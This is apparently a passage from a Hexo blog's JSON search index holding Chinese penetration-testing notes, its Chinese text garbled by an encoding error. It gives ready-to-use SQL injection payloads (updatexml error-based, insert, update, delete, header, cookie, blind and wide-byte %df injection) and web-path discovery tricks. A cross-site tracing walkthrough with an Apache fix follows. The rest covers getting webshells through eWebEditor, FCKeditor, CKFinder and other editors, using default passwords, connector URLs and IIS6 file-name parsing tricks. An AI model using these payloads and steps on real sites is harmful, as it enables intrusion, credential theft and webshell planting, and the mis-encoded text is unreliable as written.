updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)# extractvalueï¼ˆï¼‰ :å‡½æ•°ä¹Ÿæ˜¯MYSQLå¯¹XMLæ–‡æ¡£æ•°æ®è¿›è¡ŒæŸ¥è¯¢çš„XPATHå‡½æ•°. floorï¼ˆï¼‰:MYSQLä¸­ç”¨æ¥å–æ•´çš„å‡½æ•°. insertæ³¨å…¥ å‰ç«¯æ³¨å†Œçš„ä¿¡æ¯æœ€ç»ˆä¼šè¢«åå°é€šè¿‡insertè¿™ä¸ªæ“ä½œæ’å…¥æ•°æ®åº“ï¼Œåå°åœ¨æ¥å—å‰ç«¯çš„æ³¨å†Œæ•°æ®æ—¶æ²¡æœ‰åšé˜²SQLæ³¨å…¥çš„å¤„ç† è¿›å…¥ç½‘ç«™æ³¨å†Œé¡µé¢ï¼Œå¡«å†™ç½‘ç«™æ³¨å†Œç›¸å…³ä¿¡æ¯ï¼Œé€šè¿‡BurpæŠ“åŒ…åœ¨ç”¨æˆ·åè¾“å…¥ç›¸å…³payload oldboyâ€™or updatexml(1,concat(0x7e,(å‘½ä»¤)),0) orâ€™ \\1. çˆ†è¡¨å oldboyâ€™or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=â€™pikachuâ€™ limit 0,1)),0) orâ€™ \\2. çˆ†åˆ—å â€˜ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=â€™usersâ€™limit 2,1)),0) orâ€™ \\3. çˆ†å†…å®¹ â€˜ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) orâ€™ ç­‰åŒ â€˜ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or â€˜1â€™=â€™1â€™â€™ uodateæ³¨å…¥ ä¸insertæ³¨å…¥çš„æ–¹æ³•å¤§ä½“ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºupdateç”¨äºç”¨æˆ·ç™»é™†ç«¯ï¼Œinsertç”¨äºç”¨äºç”¨æˆ·æ³¨å†Œç«¯ â€˜ or updatexml(0,concat(0x7e,(database())),0) orâ€™ daleteæ³¨å…¥ ä¸€èˆ¬åº”ç”¨äºå‰åç«¯å‘è´´ã€ç•™è¨€ã€ç”¨æˆ·ç­‰ç›¸å…³åˆ é™¤æ“ä½œï¼Œç‚¹å‡»åˆ é™¤æŒ‰é’®æ—¶å¯é€šè¿‡Brup SuiteæŠ“åŒ…ï¼Œå¯¹æ•°æ®åŒ…ç›¸å…³deleteå‚æ•°è¿›è¡Œæ³¨å…¥ delete from message where id=56 or updatexml(2,concat(0x7e,(database())),0) http headeræ³¨å…¥ User-Agentè¾“å…¥payload Mozillaâ€™ or updatexml(1,concat(0x7e,database ()),0) or â€˜html&gt; cookieæ³¨å…¥ å¦‚æœåç«¯è·å–Cookieåæ”¾åœ¨æ•°æ®åº“ä¸­è¿›è¡Œæ‹¼æ¥ï¼Œé‚£ä¹ˆè¿™ä¹Ÿå°†æ˜¯ä¸€ä¸ªSQLæ³¨å…¥ç‚¹ åœ¨ ant[uname]=adminåæ·»åŠ ä¸€ä¸ªâ€™è§‚å¯Ÿåé¦ˆçš„MYSQLçš„è¯­æ³•æŠ¥é”™ï¼Œå‘ç°äº†å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œåœ¨è®¾ç½®Payload â€˜and updatexml (1,concat(0x7e,database()),0)#,è§‚å¯ŸæŠ¥é”™å’Œä¹‹å‰æ˜¯å¦ç›¸åŒ ç›²æ³¨(base on boolian)ã€ç›²æ³¨(base on time) å¸ƒå°”ç›²æ³¨ åœ¨SQLæ³¨å…¥è¿‡ç¨‹ä¸­ï¼ŒSQLè¯­å¥æ‰§è¡Œé€‰æ‹©åï¼Œé€‰æ‹©çš„æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç›²æ³¨ã€‚ è¾“å…¥è¯­å¥select ascii(substr(database(),1,1))&gt;xx;é€šè¿‡å¯¹æ¯”asciiç çš„é•¿åº¦ï¼Œåˆ¤æ–­å‡ºæ•°æ®åº“è¡¨åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚ æ³¨: substr()å‡½æ•° string(å¿…éœ€)è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚start(å¿…éœ€)è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚length(å¯é€‰)è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚ åœ¨å®é™…æ“ä½œä¸­é€šå¸¸ä¸ä¼šä½¿ç”¨æ‰‹åŠ¨ç›²æ³¨çš„åŠæ³•ï¼Œå¯ä»¥ä½¿ç”¨sqlmapç­‰å·¥å…·æ¥å¢åŠ ç›²æ³¨çš„æ•ˆç‡ã€‚ æ—¶é—´ç›²æ³¨ payload: vinceâ€™ and sleep(x)# vinceâ€™ and if(substr(database(),1,1)=â€™Xâ€™ (çŒœæµ‹ç‚¹)â€™,sleep(10),null# è¾“å…¥åï¼Œå¦‚æœçŒœæµ‹çœŸç¡®ï¼Œé‚£ä¹ˆå°±ä¼šå“åº”10ç§’ï¼Œå¦‚æœé”™è¯¯ä¼šç«‹åˆ»è¿”å›é”™è¯¯ã€‚ è¾“å…¥ï¼švinceâ€™ and if(substr(database(),1,1)=â€™pâ€™,sleep(10),null)# åœ¨webæ§åˆ¶å°ä¸‹ï¼Œåˆ¤æ–­å‡ºdatabaseçš„è¡¨åçš„ä¸€ä¸ªå­—ç¬¦ä¸ºp å®½å­—èŠ‚æ³¨å…¥ å½“æˆ‘ä»¬æŠŠphp.iniæ–‡ä»¶é‡Œé¢çš„magic_quotes_gqcå‚æ•°è®¾ä¸ºONæ—¶ï¼Œæ‰€æœ‰çš„â€™ï¼ˆå•å¼•å·ï¼‰ï¼Œâ€(åŒå¼•å·)ï¼Œ(åæ–œæ )å’Œnullå­—ç¬¦éƒ½ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªåæ–œæ è¿›è¡Œè½¬ä¹‰ã€‚è¿˜æœ‰å¾ˆå¤šå‡½æ•°æœ‰ç±»ä¼¼çš„ä½œç”¨å¦‚ï¼šaddslashes()ã€mysql_escape_string()ã€mysql_real_escape_string()ç­‰ï¼Œå¦å¤–è¿˜æœ‰parse_str()åçš„å˜é‡ä¹Ÿå—magic_quotes_gpcçš„å½±å“ã€‚ç›®å‰å¤§å¤šæ•°çš„ä¸»æœºéƒ½æ‰“å¼€äº†è¿™ä¸ªé€‰é¡¹ï¼Œå¹¶ä¸”å¾ˆå¤šç¨‹åºå‘˜ä¹Ÿæ³¨æ„ä½¿ç”¨ä¸Šé¢é‚£äº›å‡½æ•°å»è¿‡æ»¤å˜é‡ï¼Œè¿™çœ‹ä¸Šå»å¾ˆå®‰å…¨ï¼Œå¾ˆå¤šæ¼æ´æŸ¥æ‰¾è€…æˆ–è€…å·¥å…·é‡åˆ°è¿™äº›å‡½æ•°è¿‡æ»¤åçš„å˜é‡ç›´æ¥å°±æ”¾å¼ƒï¼Œä½†æ˜¯å°±åœ¨ä»–ä»¬æ”¾å¼ƒçš„åŒæ—¶ä¹Ÿæ”¾è¿‡å¾ˆå¤šè‡´å‘½çš„å®‰å…¨æ¼æ´ã€‚ å…¶ä¸­\\çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œå½“æˆ‘ä»¬åœ¨å•å¼•å·å‰é¢åŠ ä¸Š%dfçš„æ—¶å€™ï¼Œæœ€ç»ˆå°±ä¼šå˜æˆ é‹â€™ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™MYSQLç”¨GBKçš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º %df æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯é‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\\â€™ = %df%5c%27=ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚ â€˜ =======&gt;&#39;å•å¼•å·è½¬ä¹‰åå ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ç¹ä½“å­—%dfæ„é€ ä¸¤ä¸ªå­—èŠ‚,æœ€ç»ˆç”¨é‹å¹²æ‰äº†\\ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«é‹å é¢†äº†\\ æ‰€ä»¥æœ€ååœ¨é¡µé¢ä¹Ÿä¸ä¼šæ˜¾ç¤ºå‡ºæ¥. å“ªäº›åœ°æ–¹æ²¡æœ‰é­”æœ¯å¼•å·çš„ä¿æŠ¤ï¼Ÿ ï¼ˆ1ï¼‰ $_SERVER å˜é‡ PHP5çš„$_SERVERå˜é‡ç¼ºå°‘magic_quotes_gqcçš„ä¿æŠ¤ï¼Œå¯¼è‡´è¿‘å¹´æ¥X-Forwarded-Forçš„æ¼æ´çŒ›çˆ†ï¼Œæ‰€ä»¥å¾ˆå¤šç¨‹åºå‘˜è€ƒè™‘è¿‡æ»¤X-Forwarded-Forï¼Œä½†æ˜¯å…¶å®ƒçš„å˜é‡å‘¢ï¼Ÿ ï¼ˆ2ï¼‰getenv()å¾—åˆ°çš„å˜é‡ï¼ˆä½¿ç”¨ç±»ä¼¼$_SERVER å˜é‡ï¼‰ ï¼ˆ3ï¼‰$HTTP_RAW_POST_DATAä¸PHPè¾“å…¥ã€è¾“å‡ºæµ å†…ç½®å˜é‡çˆ†æ•°æ®åº“ç±»å‹ â€œUserâ€æ˜¯SQL Serverçš„ä¸€ä¸ªå†…ç½®å˜é‡ï¼Œå®ƒçš„å€¼æ˜¯å½“å‰è¿æ¥çš„ç”¨æˆ·åï¼Œå…¶å˜é‡ç±»å‹ä¸ºâ€œnvarcharâ€å­—ç¬¦å‹ æ–¹æ³•ï¼šåœ¨æ³¨å…¥ç‚¹ä¹‹åæäº¤ and user&gt;0 é”™è¯¯ä¿¡æ¯ï¼š â€‹ Microsoft OLE DB Provider for SQL Server é”™è¯¯â€™80040e21â€™ï¼ˆMS SQLæ•°æ®åº“ï¼‰ â€‹ å°†nvarcharå€¼â€™â€™è½¬æ¢ä¸ºæ•°æ®ç±»å‹ä¸ºintçš„åˆ—æ—¶å‘ç”Ÿè¯­æ³•é”™è¯¯ã€‚ï¼ˆAccessæ•°æ®åº“ï¼‰ 1.6å®æˆ˜ access æ•°æ®åº“https://www.jianshu.com/p/fc1e26d3ad45 mysql æ•°æ®åº“https://www.jianshu.com/p/f98ab1b4b12e 1.7è·å–Webè·¯å¾„(1)ä¸€èˆ¬å¯ä»¥åœ¨å˜é‡åé¢åŠ ä¸Šå•å¼•å·ã€æ”¹å˜å‚æ•°ç±»å‹ã€å¢åŠ å‚æ•°ä½æ•°ç­‰æ¥é€ æˆMySQLæ•°æ®åº“å‡ºé”™ï¼Œçˆ†å‡ºWebç‰©ç†è·¯å¾„ã€‚ ï¼ˆ2ï¼‰é€šè¿‡æ‰«æå™¨æ‰«webæœåŠ¡å™¨é—ç•™æ–‡ä»¶ php.phpã€info.phpã€phpinfo.phpã€test.php ï¼ˆ3ï¼‰åˆ©ç”¨æœç´¢å¼•æ“æ¥æŸ¥æ‰¾Webç›®å½•ã€‚æœç´¢å¼•æ“æœ‰æ—¶å€™ä¼šå¯¹ç½‘ç«™é¡µé¢è¿›è¡Œå¿«ç…§æŠ“å–ï¼ŒåŒ…æ‹¬è„šæœ¬å‡ºé”™é¡µé¢ï¼Œå› æ­¤å¯åˆ©ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾ç½‘ç«™çš„å‡ºé”™ä¿¡æ¯ï¼Œä»è€Œè·å¾—ç½‘ç«™çš„ç‰©ç†è·¯å¾„ã€‚å¯åœ¨Googleæˆ–ç™¾åº¦ä¸­æœç´¢â€œmysql site:.comâ€æˆ–â€œwarning site:.com,error site:***.com.cnâ€ç­‰ã€‚ è¿™é‡Œä½¿ç”¨â€œerror site:***.comâ€å…³é”®å­—è¿›è¡ŒæŸ¥è¯¢ï¼Œä»æœç´¢ç»“æœä¸­å¾—åˆ°äº†ç½‘ç«™çš„ç‰©ç†è·¯å¾„ä¸ºâ€œE:\\pujing2015â€ã€‚ (4) æ¼æ´æš´è·¯å¾„ï¼Œä¾‹å¦‚é€šè¿‡ç½‘ç«™åå°æŸ¥çœ‹ç½‘ç«™Webè·¯å¾„ã€CCæ”»å‡»æš´è·¯å¾„ç­‰. (6)é€šè¿‡é…ç½®æ–‡ä»¶æ‰¾ç½‘ç«™è·¯å¾„,åœ¨ç™¾åº¦é‡Œé¢è¾“å…¥***é…ç½®æ–‡ä»¶,å¦‚:IIS6.0é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ‰¾åˆ°: C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml å’ŒC:\\WINDOWS\\system32\\inetsrv\\MetaBase.bin è¿™ä¸¤ä¸ªé…ç½®æ–‡ä»¶ï¼ˆå°æŠ€å·§:åœ¨ç™¾åº¦é‡Œé¢è¾“å…¥:load_file()å¸¸ç”¨æ•æ„Ÿä¿¡æ¯ï¼Œå°±å¯ä»¥æ‰¾åˆ°åˆ«äººå…¥ä¾µè¿‡ç¨‹ä¸­æ€»ç»“çš„å¸¸ç”¨æ•æ„Ÿæ–‡ä»¶è·¯å¾„ï¼‰ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"è·¨ç«™è·Ÿè¸ªæ”»å‡»","slug":"è·¨ç«™è·Ÿè¸ªæ”»å‡»","date":"2019-07-15T08:42:07.000Z","updated":"2020-09-20T08:56:02.870Z","comments":true,"path":"2019/07/15/è·¨ç«™è·Ÿè¸ªæ”»å‡»/","link":"","permalink":"https://zhangyanlady.github.io/2019/07/15/%E8%B7%A8%E7%AB%99%E8%B7%9F%E8%B8%AA%E6%94%BB%E5%87%BB/","excerpt":"","text":"[è·¨ç«™è·Ÿè¸ªæ”»å‡»(CST/XST)]å±äºåå°„å‹ï¼Œå±å®³ä¸å¤§ è·¨ç«™è·Ÿè¸ªæ”»å‡»å³CSTæ”»å‡»ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨XSSå’ŒHTTP TRACEåŠŸèƒ½æ¥è¿›è¡Œæ”»å‡»çš„æ–¹å¼ã€‚æµè§ˆå™¨æœ‰ä¸€ä¸ªå®‰å…¨ç­–ç•¥ï¼Œé€šè¿‡è®¾ç½®cookieçš„httponlyå±æ€§ï¼Œè¿™æ ·å®¢æˆ·ç«¯è„šæœ¬å°±ä¸èƒ½é€šè¿‡document.cookieè®¿é—®è¯¥cookieï¼Œå³ä½¿æœ‰XSSæ¼æ´ï¼Œä¹Ÿä¸èƒ½ç›—å–ç”¨æˆ·cookieã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨HTTP TRACEæ–¹æ³•æ¥è·å–åˆ°ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚ TRACEä½œç”¨ï¼šå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚å¯èƒ½è¦ç©¿è¿‡é˜²ç«å¢™ã€ä»£ç†ã€ç½‘å…³æˆ–å…¶ä»–ä¸€äº›åº”ç”¨ç¨‹åºã€‚æ¯ä¸ªä¸­é—´èŠ‚ç‚¹éƒ½å¯èƒ½ä¼šä¿®æ”¹åŸå§‹çš„ HTTP è¯·æ±‚ã€‚TRACE æ–¹æ³•å…è®¸å®¢æˆ·ç«¯åœ¨ æœ€ç»ˆå°†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨æ—¶ï¼Œçœ‹çœ‹å®ƒå˜æˆäº†ä»€ä¹ˆæ ·å­ã€‚ å®æˆ˜1.burpæŠ“åŒ… 2.ä¿®æ”¹get/postè¯·æ±‚å¤´ä¸ºTRACE //TRACEä½œç”¨ï¼šå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚å¯èƒ½è¦ç©¿è¿‡é˜²ç«å¢™ã€ä»£ç†ã€ç½‘å…³æˆ–å…¶ä»–ä¸€äº›åº”ç”¨ç¨‹åºã€‚æ¯ä¸ªä¸­é—´èŠ‚ç‚¹éƒ½å¯èƒ½ä¼šä¿®æ”¹åŸå§‹çš„ HTTP è¯·æ±‚ã€‚TRACE æ–¹æ³•å…è®¸å®¢æˆ·ç«¯åœ¨ æœ€ç»ˆå°†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨æ—¶ï¼Œçœ‹çœ‹å®ƒå˜æˆäº†ä»€ä¹ˆæ ·å­ã€‚ 3.ä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„ä»»æ„ä¸€ä¸ªå­—æ®µï¼Œä¾‹å¦‚Cookieå­—æ®µï¼Œæ’å…¥XSSä»£ç ï¼Œå¦‚ä¸‹ï¼šCookie: alert(\"TRACE XSS\") 4.ä¿®æ”¹å“åº”åŒ…ä¸­çš„æ˜¾ç¤ºç±»å‹å°†Content-Type:message/http æ”¹ä¸º Content-Type:text/html Cookieå‘é€è¯·æ±‚åé¡µé¢å°±ä¼šå¼¹å‡ºä»£ç å†…å®¹äº† ä¿®å¤å»ºè®®ApacheæœåŠ¡å™¨ï¼š è™šæ‹Ÿä¸»æœºå¯ä»¥åœ¨.htaccessæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç è¿‡æ»¤TRACEè¯·æ±‚: 123RewriteEngine onRewriteCond %&#123;REQUEST_METHOD&#125; ^(TRACE|TRACK)RewriteRule .* - [F] æœåŠ¡å™¨ç”¨æˆ·åœ¨httpd.confå°¾éƒ¨æ·»åŠ å¦‚ä¸‹æŒ‡ä»¤åï¼Œé‡å¯apacheå³å¯:TraceEnable off","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ç¼–è¾‘å™¨æ¼æ´","slug":"ç¼–è¾‘å™¨æ¼æ´","date":"2019-07-09T14:05:25.000Z","updated":"2020-09-20T08:53:45.655Z","comments":true,"path":"2019/07/09/ç¼–è¾‘å™¨æ¼æ´/","link":"","permalink":"https://zhangyanlady.github.io/2019/07/09/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"ä¸€.æœ¬æ–‡ä»‹ç»1ã€æœ¬æ–‡ä»‹ç»Ewebeditorå¸¸è¯†ã€è·å–webshellã€fckeditorè·å–webshellã€æ—æ³¨åŸç†ã€ipé€†å‘æŸ¥è¯¢ã€ç›®å½•è¶ŠæƒåŠè·¨åº“æŸ¥è¯¢ã€cdnç»•è¿‡ã€‚ äºŒ.å­¦ä¹ æ­¥éª¤1ã€Ewebeditorå¸¸è¯†ï¼šé»˜è®¤åå°ï¼šxxxx.com/ewebeditor/admin_login.asp æ•°æ®åº“åœ°å€ï¼šewebeditor/db/ewebeditor.mdb å¸å·ï¼šadmin å¯†ç ï¼šadmin/admin888/admin000(å„ç§å¼±å£ä»¤) å¸¸ç”¨æ•°æ®åº“è·¯å¾„ä¸º: ewebeditor/db/ewebeditor.asa ewebeditor/db/ewebeditor.asp ewebeditor/db/#ewebeditor.asa ewebeditor/db/#ewebeditor.mdb ewebeditor/db/ewebeditor.mdb ewebeditor/db/!@#ewebeditor.asp ewebeditor/db/ewebeditor1033.mdb ç­‰ é»˜è®¤æ•°æ®åº“ä¸‹è½½æŠ¥é”™ã€‚(.mdbè¢«ä¿æŠ¤äº†ï¼Œä»è¿™é‡Œæ‰¾åˆ°.mdbåˆ é™¤å°±å¥½äº†) 2ã€Ewebeditoråå°è·å–webshell\\1. http://IP/admin_login.aspï¼šè´¦å·ï¼šadmin å¯†ç ï¼šadminï¼Œç„¶åæ·»åŠ æ ·å¼ï¼Œ åœ¨å›¾ç‰‡ç±»å‹ä¸­åŠ å…¥ä»¥ä¸‹ç±»å‹:asa|cer|asp|aaspsp æœ€åæ·»åŠ å·¥å…·æ ï¼šæ’å…¥æˆ–ä¿®æ”¹å›¾ç‰‡ å·¥å…·æ æ·»åŠ å¥½åç‚¹å‡»â€œé¢„è§ˆâ€ï¼Œä¸Šä¼ åœ¨æ ·å¼çš„å›¾ç‰‡æ ¼å¼ä¸­åŠ å…¥ceræˆ–aspç­‰ï¼Œæˆ‘ä¸Šä¼ çš„æ˜¯shell.cerï¼Œç„¶ååœ¨ä»£ç çš„åœ°æ–¹å¯ä»¥çœ‹åˆ°URLï¼Œç„¶åèœåˆ€è¿æ¥å³å¯ã€‚ç”¨ä½ç‰ˆæœ¬æµè§ˆå™¨ï¼Œé«˜ç‰ˆæœ¬å¯èƒ½æ‰“ä¸å¼€. 2ï¼‰ç›®å½•éå† ç‚¹å‡»â€ä¸Šä¼ æ–‡ä»¶ç®¡ç†â€ ç„¶åé€‰æ‹©æ ·å¼ç›®å½•ã€‚ åœ¨id=14åé¢åŠ ä¸Š&amp;dir=../ï¼Œå‘ç°æ²¡æœ‰èµ·ä½œç”¨ï¼Œé‚£å°±æ˜¯2.1.6è¿™ä¸ªç‰ˆæœ¬ä¸å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚æ¢æˆ2.8.0ã€‚2.8.0å­˜åœ¨è¿™ä¸ªæ–‡ä»¶éå†æ¼æ´ã€‚ \\4. åœ¨ä¸‹è½½çš„æ•°æ®åº“ä¸­çœ‹eWebEditor_styleè¡¨ä¸­çš„S_ImageExtå­—æ®µæ˜¯å¦æœ‰è¢«äººæ·»åŠ è¿‡ä»€ä¹ˆã€‚ ä½¿ç”¨ä¸‹é¢çš„è¯­å¥è¿›å…¥çªç ´: ewebeditor.asp?ID=xx&amp;style=yy å…¶ä¸­çš„id=xxå°±æ˜¯è¢«ä¿®æ”¹è¿‡çš„é‚£æ¡è®°å½•çš„idï¼Œè€Œyyå°±æ˜¯S_nameå­—æ®µçš„åå­—ã€‚ 3ã€Ewebeditoræ–‡ä»¶ä¸Šä¼ å®éªŒå°†ä»£ç æ–°å»ºä¸ºhtmlï¼š 1234&lt;input type&#x3D;file name&#x3D;uploadfile size&#x3D;100&gt;&lt;br&gt;&lt;br&gt;&lt;input type&#x3D;submit value&#x3D;Fuck&gt;&lt;&#x2F;form&gt; åˆ›å»ºå®Œç›´æ¥æ‰“å¼€ï¼Œç‚¹å‡»ä¸Šä¼ æŒ‰é’®å°†é©¬ä¸Šä¼ ï¼Œå³é”®æŸ¥çœ‹æºä»£ç ï¼š é»˜è®¤æ–‡ä»¶ä¸Šä¼ ä¿å­˜çš„è·¯å¾„ä¸ºewebiditor/uploadfileï¼Œè®¿é—®ï¼šhttp://IP/uploadfile/2020417145621756.cerï¼Œè¾“å…¥é©¬çš„å¯†ç ï¼š 4ã€fckeditorè·å–webshell1.æŸ¥çœ‹ç¼–è¾‘å™¨ç‰ˆæœ¬ FCKeditor/_whatsnew.html 2.FCKeditorç¼–è¾‘å™¨é¡µ FCKeditor/_samples/default.html 3.å¸¸ç”¨ä¸Šä¼ åœ°å€ FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/ FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp 2.5çš„ç‰ˆæœ¬ä¸‹é¢è¿™æ¡è¯­å¥èƒ½ç”¨ï¼š http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp æ ¹æ®æç¤ºï¼Œéœ€è¦ï¼š å¼€å¯æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½,æŠŠ\\editor\\filemanager\\connectors\\asp\\config.aspæ–‡ä»¶ä¸­çš„ DimConfigIsEnabled ConfigIsEnabled = False è®¾ç½®æˆåŠŸtrueã€‚ æ‰‹å·¥æ–°å»ºï¼š /editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=fendo.asp åŸå› ï¼š CurrentFolderï¼šå½“å‰æ–‡ä»¶å¤¹ æœªè¿›è¡Œè¿‡æ»¤(è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ²¡æœ‰è¿‡æ»¤) NewFolderNameï¼šæ–°å»ºæ–‡ä»¶å è¿›è¡Œäº†è¿‡æ»¤ æ·»åŠ æ•æ„Ÿæ–‡ä»¶å¤¹ æ•æ„Ÿç›®å½• ç™»å½•å³å¯è·å–shell CKFinderç¼–è¾‘å™¨ï¼šä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ å…¶1.4.3 asp.netç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼ŒCKFinderåœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œå¼ºåˆ¶å°†æ–‡ä»¶å(ä¸åŒ…æ‹¬åç¼€)ä¸­ç‚¹å·ç­‰å…¶ä»–å­—ç¬¦è½¬ä¸ºä¸‹åˆ’çº¿_,ä½†æ˜¯åœ¨ä¿®æ”¹æ–‡ä»¶åæ—¶å´æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ 1_php;1.jpgç­‰ç•¸å½¢æ–‡ä»¶åï¼Œæœ€ç»ˆå¯¼è‡´æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç„¶åä¿®æ”¹æ–‡ä»¶å 1_php;1.jpg åˆ©ç”¨iis6.0ç›®å½•è§£ææ¼æ´æ‹¿shell åˆ›å»ºç›®å½•/x.asp/ åœ¨ç›®å½•ä¸‹ä¸Šä¼ å›¾ç‰‡é©¬å³å¯æ‹¿shell southidceditor ï¼šå—æ–¹æ•°æ®ç¼–è¾‘å™¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ é¦–å…ˆç™»é™†åå° åˆ©ç”¨ç¼–è¾‘å™¨ä¸Šä¼  è®¿é—®admin/southidceditor/admin_style.asp ä¿®æ”¹ç¼–è¾‘å™¨æ ·å¼ï¼Œå¢åŠ asa(ä¸è¦asp).ç„¶åç›´æ¥åå°ç¼–è¾‘æ–°é—»ä¸Šä¼  UEDITORç¼–è¾‘å™¨ï¼šåˆ©ç”¨ii6.0æ–‡ä»¶åè§£ææ¼æ´ ä¸Šä¼ å›¾ç‰‡æ”¹åä¸ºï¼š x.php;20221.jpgè·å–shell DotNetTextBoxç¼–è¾‘å™¨ï¼šä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ å…³é”®å­—:system_dntb/ ç¡®å®šæœ‰system_dntb/uploadimg.aspxå¹¶èƒ½æ‰“å¼€ï¼Œè¿™æ—¶å€™æ˜¯ä¸èƒ½ä¸Šä¼ çš„ï¼Œç”±äºä»–æ˜¯éªŒè¯cookieæ¥å¾—å‡ºä¸Šä¼ åçš„è·¯å¾„ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨cookieæ¬ºéª—å·¥å…· cookie:UserType=0;IsEdition=0;Info=1; uploadFolder=../system_dntb/Upload/; è·¯å¾„å¯ä»¥ä¿®æ”¹ï¼Œåªè¦æƒé™å¤Ÿï¼Œä¸Šä¼ åæ”¹åä¸º1.asp;.jpgåˆ©ç”¨iisè§£ææ¼æ´ 